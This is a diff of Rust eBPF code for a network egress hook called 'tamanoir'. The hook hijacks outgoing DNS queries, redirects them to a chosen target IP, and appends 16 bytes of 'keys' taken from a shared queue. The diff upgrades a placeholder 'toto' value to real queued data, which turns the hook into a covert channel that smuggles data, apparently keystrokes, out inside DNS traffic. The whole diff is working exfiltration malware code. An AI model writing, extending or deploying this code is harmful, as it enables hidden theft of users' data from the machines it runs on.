@@ -16,14 +16,14 @@ use network_types::{
 };
 
 use crate::common::{
-    calculate_udp_checksum, inject_keys_payload, load_bytes, log_csums, store_bytes, update_addr,
-    update_ip_hdr_tot_len, update_port, update_udp_hdr_len, UpdateType, BPF_ADJ_ROOM_NET,
-    DNS_QUERY_OFFSET, HIJACK_IP, TARGET_IP, UDP_CSUM_OFFSET, UDP_DEST_PORT_OFFSET, UDP_OFFSET,
+    inject_keys, load_bytes, log_csums, store_bytes, update_addr, update_ip_hdr_tot_len,
+    update_port, update_udp_hdr_len, UpdateType, BPF_ADJ_ROOM_NET, DATA, DNS_QUERY_OFFSET,
+    HIJACK_IP, TARGET_IP, UDP_DEST_PORT_OFFSET, UDP_OFFSET,
 };
 
 // Maps
 
-const KEYS_PAYLOAD_LEN: usize = 4;
+const KEYS_PAYLOAD_LEN: usize = 16; // In bytes
 const DNS_PAYLOAD_MAX_LEN: usize = 124; //power of 2 mandatory for masking
 pub struct Buf {
     pub buf: [u8; DNS_PAYLOAD_MAX_LEN + KEYS_PAYLOAD_LEN],
@@ -38,6 +38,14 @@ pub fn tamanoir_egress(mut ctx: TcContext) -> i32 {
         Ok(ret) => ret,
         Err(_) => TC_ACT_PIPE,
     }
+}
+
+fn read_keys() -> Option<[u32; KEYS_PAYLOAD_LEN / 4]> {
+    let key1 = DATA.pop()?;
+    let key2 = DATA.pop()?;
+    let key3 = DATA.pop()?;
+    let key4 = DATA.pop()?;
+    Some([key1, key2, key3, key4])
 }
 
 fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
@@ -58,21 +66,15 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
                     .ok_or(())?;
 
                 if dns_payload_len < DNS_PAYLOAD_MAX_LEN {
+                    // let keys = read_keys().ok_or_else(|| ())?;
+                    let keys = read_keys().ok_or(())?;
+                    info!(ctx, "Fetch keys from the queue");
+
                     let buf = unsafe {
                         let ptr = DNS_BUFFER.get_ptr_mut(0).ok_or(())?;
                         &mut (*ptr).buf
                     };
                     load_bytes(ctx, DNS_QUERY_OFFSET, buf).map_err(|_| ())?;
-                    // ctx.load_bytes(DNS_QUERY_OFFSET, &mut buf.buf)
-                    //     .map_err(|_| ())?; //will only load tot_len - DNS_QUERY_OFFSET bytes from skbuf to buf as it takes min(tot_len-DNS_QUERY_OFFSET, dst.len())
-
-                    let mut fixed_size_added_keys = [0u8; KEYS_PAYLOAD_LEN];
-                    fixed_size_added_keys.copy_from_slice("toto".as_bytes());
-
-                    let keys_as_u32: u32 = ((fixed_size_added_keys[0] as u32) << 24)
-                        | ((fixed_size_added_keys[1] as u32) << 16)
-                        | ((fixed_size_added_keys[2] as u32) << 8)
-                        | fixed_size_added_keys[3] as u32;
 
                     log_csums(ctx);
                     update_addr(ctx, &addr, &target_ip.to_be(), UpdateType::Dst)?;
@@ -85,7 +87,8 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
                     //make room
                     info!(ctx, "adjust room");
                     ctx.skb
-                        .adjust_room(KEYS_PAYLOAD_LEN as i32, BPF_ADJ_ROOM_NET, 0)
+                        // .adjust_room(KEYS_PAYLOAD_LEN as i32, BPF_ADJ_ROOM_NET, 0)
+                        .adjust_room(16i32, BPF_ADJ_ROOM_NET, 0)
                         .map_err(|_| {
                             error!(ctx, "error adjusting room");
                         })?;
@@ -110,11 +113,11 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
                     info!(ctx, "injecting dns payload  @{}  ", DNS_QUERY_OFFSET);
                     store_bytes(ctx, DNS_QUERY_OFFSET, buf, 0).map_err(|_| ())?;
 
-                    inject_keys_payload(
-                        ctx,
-                        DNS_QUERY_OFFSET + dns_payload_len,
-                        &keys_as_u32.to_be(),
-                    )?;
+                    ctx.store(DNS_QUERY_OFFSET, &buf, 0).map_err(|_| {
+                        error!(ctx, "error shifting dns payload ");
+                    })?;
+
+                    inject_keys(ctx, DNS_QUERY_OFFSET + dns_payload_len, keys)?;
 
                     //recompute checksum layer 4
                     //set current csum to 0
